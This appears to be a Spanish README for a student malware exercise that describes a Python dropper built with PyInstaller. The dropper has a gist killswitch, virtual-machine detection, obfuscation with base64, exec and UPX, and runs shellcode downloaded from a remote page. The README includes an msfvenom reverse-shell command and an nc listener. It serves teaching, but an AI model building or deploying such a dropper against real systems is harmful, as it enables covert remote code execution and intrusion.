============================================================
  DROPPER - Práctica Malware  |  Autor: <tu nombre>
============================================================

DESCRIPCIÓN
-----------
Dropper desarrollado en Python 3 compilado a binario nativo
para Linux usando PyInstaller. Implementa:
  A) Killswitch vía GIST de GitHub
  B) Detección de VM (cloud metadata, cpuinfo, qemu-guest-agent)
  C) Ejecución de shellcode descargado dinámicamente (base64)
  D) Ofuscación: wrapper base64+exec en cada módulo + PyInstaller
     --onefile --strip + compresión UPX opcional

URLS DE CONFIGURACIÓN
---------------------
  Killswitch : https://gist.githubusercontent.com/<user>/<id>/raw
  Payload    : https://<tu-host>/payload.html
  (Indicar aquí las URLs reales usadas en la entrega)

DEPENDENCIAS
------------
  - requests  : HTTP para killswitch y descarga de payload
  - PyInstaller: compilación a ELF nativo (incluye deps en el binario)
  Las dos se instalan automáticamente por el builder.

BUILD
-----
  ./builder <killswitch_url> <payload_url>
  Binario resultante: dist/dropper_bin

PRUEBAS EN DOCKER
-----------------
  docker run -it -v $(pwd):/data ubuntu:24.04
  cd /data
  apt-get update && apt-get install -y python3 python3-pip
  ./builder "https://..." "https://..."
  ./dist/dropper_bin

GENERAR PAYLOAD CON MSFVENOM
-----------------------------
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 \
    -f raw | base64 -w0

  Subir a la URL del payload con el formato:
  <!-- HELLO!:<base64_del_shellcode>:!BYE -->

  Listener:
  nc -lvnp 4444

OBFUSCACIÓN — DECISIONES
------------------------
  1. Cada módulo Python se codifica en base64 antes de compilar.
     El cargador es "exec(compile(base64.decode(...)))".
  2. PyInstaller --onefile genera un ELF que incluye el intérprete
     Python y todas las dependencias; no se puede desensamblar
     directamente como código Python legible.
  3. --strip elimina símbolos de depuración del binario.
  4. UPX comprime y añade una capa extra de ofuscación al ELF.

MÓDULOS
-------
  killswitch.py : requests.get → busca "QUIETO PARAO"; fail-safe = parar
  vm_detect.py  : urllib (stdlib) para cloud, open("/proc/cpuinfo")
                  y os.listdir("/proc") para qemu-agent; sin libs nativas
  payload.py    : requests + re + base64 + ctypes/mmap RWX para shellcode
============================================================
